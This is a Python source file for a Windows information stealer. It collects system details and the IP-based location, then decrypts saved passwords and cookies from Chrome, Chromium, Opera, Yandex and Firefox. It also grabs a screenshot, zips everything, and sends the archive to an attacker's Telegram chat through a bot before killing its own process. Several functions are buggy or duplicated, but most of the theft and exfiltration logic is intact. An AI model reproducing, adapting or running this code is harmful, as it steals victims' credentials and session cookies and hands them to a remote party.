import os
import sqlite3
import win32crypt
import shutil
import requests
import zipfile
import getpass
import win32api
import platform
import time
import sys
from PIL import ImageGrab
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from base64 import encodebytes
import asyncio
from aiogram import Dispatcher, Bot, executor


TOKEN_API = ""
OWNER_CHAT_ID = ""


drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('\000')[:-1])
response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: '+requests.get("https://ramziv.com/ip").text+'\nГород: '+response.city+'\nGen_Location:' + response.to_json() + '\nДиски:' + drives
file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+")
file.write(all_data)
file.close()

def Chrome(): 
   text = 'Passwords Chrome:' + '\n' 
   text += 'URL | LOGIN | PASSWORD' + '\n' 
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): 
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') 
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
           login = result[1]
           url = result[0]
           if password != '':
               text += url + ' | ' + login + ' | ' + password + '\n' 
   return text
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+") 
file.write(str(Chrome()) + '\n')
file.close()

#CHROME PASS

def Chrome(): 
   text = 'Passwords Chrome:' + '\n' 
   text += 'URL | LOGIN | PASSWORD' + '\n' 
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): 
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') 
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
           login = result[1]
           url = result[0]
           if password != '':
               text += url + ' | ' + login + ' | ' + password + '\n' 
   return text
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
file.write(str(Chrome()) + '\n')
file.close()

# GOOGLE COOKIES

def Chrome_cockie():
   textc = 'Cookies Chrome:' + '\n'
   textc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textc
file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+") 
file.write(str(Chrome_cockie()) + '\n')
file.close()

#FIREFOX COOKIES

def Firefox():
   textf = ''
   textf +='Firefox Cookies:' + '\n'
   textf += 'URL | COOKIE | COOKIE NAME' + '\n'
   for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
       for name in dirs:
           conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
           cursor = conn.cursor()
           cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
           data = cursor.fetchall()
           for i in range(len(data)):
               url, cookie, name = data[i]
               textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'     
       break
   return textf
#file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")
#file.write(str(Firefox()) + '\n')
#file.close()

#CHROMIUM PASSWORDS.                         

def chromium():
   textch ='Chromium Passwords:' + '\n'
   textch += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textch += url + ' | ' + login + ' | ' + password + '\n'
               return textch
file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")
file.write(str(chromium()) + '\n')
file.close()

#CHROMIUM COOKIES.                                

def chromiumc():
   textchc = '' 
   textchc +='Chromium Cookies:' + '\n'
   textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textchc
file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")
file.write(str(chromiumc()) + '\n')
file.close()

#OPERA PASS.

def Opera():
   texto = 'Passwords Opera:' + '\n'
   texto += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
       shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()

#FIREFOX_COOKIES.

def Firefox_cookies():
   texto = 'Passwords firefox:' + '\n'
   texto += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox'):
       shutil.copy2(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2', os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\firefox_pass.txt', "w+")
file.write(str(Firefox_cookies()) + '\n')
file.close()

#YANDEX PASS.

def Yandexpass():
    textyp = 'Passwords Yandex:' + '\n'
    textyp += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandexe\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textyp += url + ' | ' + login + ' | ' + password + '\n'
    return textyp
file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")
file.write(str(Yandexpass()) + '\n')
file.close()

#COOKIES OPERA.

def Opera_c():
    textoc ='Cookies Opera:' + '\n'
    textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      cursor = conn.cursor()
      cursor.execute("SELECT * from cookies")
      for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textoc
file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")
file.write(str(Opera_c()) + '\n')
file.close()

#ScreenSteal
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sсreenshot.jpg')

#Pack to zip
zname = r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
NZ = zipfile.ZipFile(zname,'w')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandex_passwords.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sсreenshot.jpg')
NZ.close()

#DOC
doc = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip' 

def sender(file):
    bot = Bot(token=TOKEN_API)
    dp = Dispatcher(bot)

    async def send_file_bot():
        await bot.send_document(chat_id=OWNER_CHAT_ID, document=open(file, "rb"))
        pid = str(os.getpid())
        os.system(f"taskkill /PID {pid} /F")
    
    loop = asyncio.get_event_loop()
    loop.create_task(send_file_bot())
    
    executor.start_polling(dp)


sender(doc)

